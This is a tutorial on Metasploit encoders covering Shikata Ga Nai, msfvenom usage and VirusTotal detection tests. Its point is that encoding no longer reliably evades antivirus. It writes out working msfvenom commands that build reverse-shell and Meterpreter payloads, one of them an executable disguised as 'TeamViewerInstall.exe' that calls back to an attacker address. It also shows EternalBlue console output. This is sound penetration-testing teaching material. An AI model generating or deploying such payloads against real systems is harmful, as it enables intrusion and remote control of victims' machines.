# Metasploit Framework: Encoders

---

## Table of Contents

1. [What an encoder actually does](#1-what-an-encoder-actually-does)
2. [Why encoders aren't the AV-evasion silver bullet they used to be](#2-why-encoders-arent-the-av-evasion-silver-bullet-they-used-to-be)
3. [Shikata Ga Nai (SGN)](#3-shikata-ga-nai-sgn)
4. [A brief history: msfpayload + msfencode → msfvenom](#4-a-brief-history-msfpayload--msfencode--msfvenom)
5. [Generating a payload with msfvenom](#5-generating-a-payload-with-msfvenom)
6. [Seeing the encoding difference side by side](#6-seeing-the-encoding-difference-side-by-side)
7. [Selecting an encoder in msfconsole](#7-selecting-an-encoder-in-msfconsole)
8. [Reality check: does encoding actually beat modern AV?](#8-reality-check-does-encoding-actually-beat-modern-av)
9. [Checking detection rates with msf-virustotal](#9-checking-detection-rates-with-msf-virustotal)
10. [Cheat sheet](#10-cheat-sheet)

---

## 1. What an encoder actually does

An **encoder** is a Metasploit component that transforms a payload's raw bytes, without changing what the payload actually *does*. Over the 15+ years of Metasploit's existence, encoders have served two main purposes:

| Purpose | What it means |
|---|---|
| **Architecture compatibility** | Make a payload run correctly on a specific processor architecture |
| **Bad character removal** | Strip out bytes that would break the exploit or get filtered by the vulnerable service |

### Supported architectures

```
x64   x86   sparc   ppc   mips
```

### What are "bad characters"?

Some vulnerable services can't handle certain byte values in their input — for example, a null byte (`\x00`) might be interpreted as "end of string" and cut the payload short before it finishes delivering. Encoders rewrite the payload's bytes so none of these problem values appear, while still having the payload behave exactly the same once it runs.

**Analogy:** imagine mailing a letter through a postal system that refuses any envelope containing the letter "Z." An encoder is like rewriting your message in a cipher that avoids "Z" entirely — the recipient can still decode and read the original message perfectly, but it got past the filter that would have rejected it.

> **Note:** a third benefit people associate with encoders is helping to dodge antivirus detection — but as the next section explains, this role has weakened a lot over time.

---

## 2. Why encoders aren't the AV-evasion silver bullet they used to be

Encoding a payload used to meaningfully help it slip past antivirus and IPS/IDS products. That advantage has **diminished significantly** as security vendors have improved how they detect encoded and obfuscated malware. Modern AV engines look deeper than just matching a fixed byte pattern (a "signature") — they analyze behavior, structure, and other heuristics that a simple encoding pass doesn't hide.

**Bottom line:** encoders are still genuinely useful for the *compatibility* and *bad character* reasons above, but you shouldn't expect encoding alone to make a payload invisible to a modern antivirus product.

---

## 3. Shikata Ga Nai (SGN)

**Shikata Ga Nai** is probably the most famous Metasploit encoder. The name is Japanese for *"it cannot be helped"* or *"nothing can be done about it."*

- It was historically one of the **hardest encoding schemes to detect**, which made it extremely popular.
- It's a **polymorphic** encoder: each time you encode the same payload, the resulting bytes look different, even though the payload still does the same thing. This made simple signature-matching much harder.
- **Today**, detection tools have largely caught up. SGN-encoded payloads are far from universally undetectable anymore.

---

## 4. A brief history: msfpayload + msfencode → msfvenom

### Before 2015: two separate tools

Payload generation and encoding used to be handled by **two separate scripts**, packaged apart from `msfconsole`, living in `/usr/share/framework2/`:

| Tool | Job |
|---|---|
| `msfpayload` | Generate a raw payload |
| `msfencode` | Encode an existing payload |

To build a working, encoded payload, you had to **pipe** the output of one into the other:

```bash
$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)

my $buf =
"\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
"\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
<SNIP>
```

**Reading this command:**

- `msfpayload windows/shell_reverse_tcp LHOST=... LPORT=... R` → generate a raw reverse shell payload (`R` = output raw bytes)
- `|` → pipe those raw bytes into the next command
- `msfencode -b '\x00' -f perl -e x86/shikata_ga_nai` → encode it, avoiding the null byte (`-b`), output as Perl code (`-f`), using the SGN encoder (`-e`)

### After 2015: merged into `msfvenom`

Both tools were **combined into a single tool, `msfvenom`**, which now handles payload generation *and* encoding together. This is the modern, standard way to do it — no more piping between two separate scripts.

---

## 5. Generating a payload with msfvenom

### Without encoding

```bash
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of perl file: 1674 bytes
my $buf =
"\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" .
"\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" .
<SNIP>
```

### Flag reference

| Flag | Meaning |
|---|---|
| `-a x86` | Target architecture |
| `--platform windows` | Target platform |
| `-p <payload>` | The payload to generate |
| `LHOST=... LPORT=...` | Payload options (attacker IP and port) |
| `-b "\x00"` | Bytes to avoid ("bad characters") |
| `-f perl` | Output format (here, Perl source code) |
| `-e <encoder>` | Which encoder to use |
| `-i <n>` | Number of encoding iterations |
| `-o <path>` | Output file path |

> **Interesting detail:** even without explicitly passing `-e`, msfvenom still reports using `x86/shikata_ga_nai` here. When you specify bad characters to avoid (`-b`), msfvenom automatically picks a compatible encoder to make sure those bytes are removed, choosing from the compatible list it finds (`Found 11 compatible encoders`).

---

## 6. Seeing the encoding difference side by side

Now compare the same payload, explicitly encoded with SGN (`-e x86/shikata_ga_nai`):

```bash
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes
buf = ""
buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
<SNIP>
```

**Compare the raw bytes:**

```
Without -e flag explicit:  \xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9...
With -e explicit (3 passes): \xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31...
```

Even though both runs use the same encoder, the output bytes differ — this is the **polymorphic** nature of SGN at work: every encoding run (and every additional iteration) scrambles the byte pattern differently, while the payload's actual behavior stays the same.

---

## 7. Selecting an encoder in msfconsole

Once an exploit and payload are chosen, msfconsole can show you which encoders are **compatible** with that specific combination, using `show encoders`.

### Example 1: MS17-010 EternalBlue with a Meterpreter x64 payload

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

Only 5 encoders show up, all **x64-compatible**, because the selected payload is 64-bit. Just like `show payloads`, msfconsole automatically **filters** the encoder list to match what's actually usable with the current module and payload.

### Example 2: a different (x86) exploit, more options available

```
msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

Compatible Encoders
===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   generic/none                             normal     The "none" Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```

Notice the **Rank** column — this tells you how *reliable* an encoder is considered. `x86/shikata_ga_nai` has a rank of **excellent**, which is why it's the go-to choice by default in most situations.

---

## 8. Reality check: does encoding actually beat modern AV?

The source walks through a hands-on test to illustrate just how much AV detection has caught up to encoding tricks. **This is purely illustrative** — it's meant to show why encoding alone is no longer a reliable evasion method, not as a how-to for actually evading antivirus.

### Attempt 1: single pass of SGN

```bash
$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe
```

This generates a Windows `.exe` with a Meterpreter reverse shell hidden inside, encoded once with SGN. When this file was checked against VirusTotal (a service that scans a file against dozens of antivirus engines at once), **54 out of the tested engines flagged it**.

### Attempt 2: ten passes of SGN

```bash
$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai succeeded with size 449 (iteration=3)
x86/shikata_ga_nai succeeded with size 476 (iteration=4)
x86/shikata_ga_nai succeeded with size 503 (iteration=5)
x86/shikata_ga_nai succeeded with size 530 (iteration=6)
x86/shikata_ga_nai succeeded with size 557 (iteration=7)
x86/shikata_ga_nai succeeded with size 584 (iteration=8)
x86/shikata_ga_nai succeeded with size 611 (iteration=9)
x86/shikata_ga_nai chosen with final size 611
Payload size: 611 bytes
Final size of exe file: 73802 bytes
```

Each extra iteration re-encodes the already-encoded output, growing the payload a little each time (368 → 395 → 422 → ... → 611 bytes). This time, **52 engines still flagged it** — barely an improvement.

### The takeaway

| Attempt | Encoding iterations | Detections |
|---|---|---|
| 1 | 1 | 54 engines |
| 2 | 10 | 52 engines |

Running the same encoder ten times over barely moved the needle. This drives home the point from Section 2: **encoding alone, even stacked repeatedly, is not an effective modern AV-evasion strategy.** Real evasion requires different techniques entirely, which fall outside the scope of this module.

---

## 9. Checking detection rates with msf-virustotal

Metasploit ships a helper tool, **`msf-virustotal`**, that automates uploading a file to VirusTotal and pulling back the scan report. It requires a **free VirusTotal account** to get an API key.

```bash
$ msf-virustotal -k <API key> -f TeamViewerInstall.exe

[*] Using API key: <API key>
[*] Please wait while I upload TeamViewerInstall.exe...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130
[*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>
[*] Requesting the report...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbe...

 Antivirus             Detected  Version          Result                      Update
 ---------             --------  -------          ------                      ------
 ALYac                 true      1.1.3.1          Trojan.CryptZ.Gen          20220505
 APEX                  true      6.288            Malicious                  20220504
 AVG                   true      21.1.5827.0      Win32:SwPatch [Wrm]        20220505
 Acronis               true      1.2.0.108        suspicious                 20220426
 <SNIP>
```

**Reading this:**

- `(51 / 68)` means 51 out of 68 scanned antivirus engines flagged the file as malicious.
- The `Received code -2` lines just mean VirusTotal's analysis is still processing — the tool polls every 60 seconds until the report is ready.
- Each antivirus vendor gives its own internal name for the detected threat (`Trojan.CryptZ.Gen`, `Malicious`, `Win32:SwPatch [Wrm]`, etc.) — these naming conventions differ by vendor and don't always describe the same underlying technique.

> **Important caution about VirusTotal:** uploading a sample to VirusTotal shares it with many security vendors. If you're testing something sensitive (like a custom payload for an authorized engagement), be aware that uploading it publicizes its signature industry-wide — this is a real operational consideration, not just a technical one.

**Overall conclusion:** most antivirus products you'll encounter in real engagements will still catch an encoded Metasploit payload like this. Serious AV evasion requires other techniques — beyond basic encoding — which are outside the scope of this introductory module.

---

## 10. Cheat sheet

### What encoders are for (realistically, today)

| Purpose | Still effective? |
|---|---|
| Architecture compatibility | ✅ Yes — core purpose |
| Removing bad characters | ✅ Yes — core purpose |
| Antivirus evasion | ⚠️ Largely no — modern AV has caught up |

### Key commands

| Command | Purpose |
|---|---|
| `show encoders` | List encoders compatible with the currently selected exploit + payload |
| `msfvenom -e <encoder>` | Encode a generated payload with a specific scheme |
| `msfvenom -i <n>` | Run the encoder for `n` iterations |
| `msfvenom -b "\xNN"` | Specify bytes to avoid ("bad characters") |
| `msfvenom -f <format>` | Output format (exe, perl, raw, etc.) |
| `msf-virustotal -k <API key> -f <file>` | Upload a file to VirusTotal and get its detection report |

### Big-picture takeaways

1. **Encoders exist primarily for compatibility and bad-character removal** — not, these days, for reliable AV evasion.
2. **Shikata Ga Nai (SGN)** is the best-known encoder: polymorphic, historically very evasive, now well understood by modern AV.
3. **`msfpayload` + `msfencode` → merged into `msfvenom`** after 2015. `msfvenom` is the modern, standard tool.
4. **`show encoders` auto-filters** to only show encoders compatible with your currently selected exploit/payload — same pattern as `show payloads`.
5. **More encoding iterations ≠ much better evasion.** The real-world test showed almost no improvement (54 → 52 detections) going from 1 to 10 passes.
6. **`msf-virustotal`** is a convenient way to check detection rates, but remember uploads are shared broadly across the security industry.
7. **True AV/EDR evasion is a separate, deeper discipline** than basic Metasploit encoding — worth exploring in dedicated modules later.

---
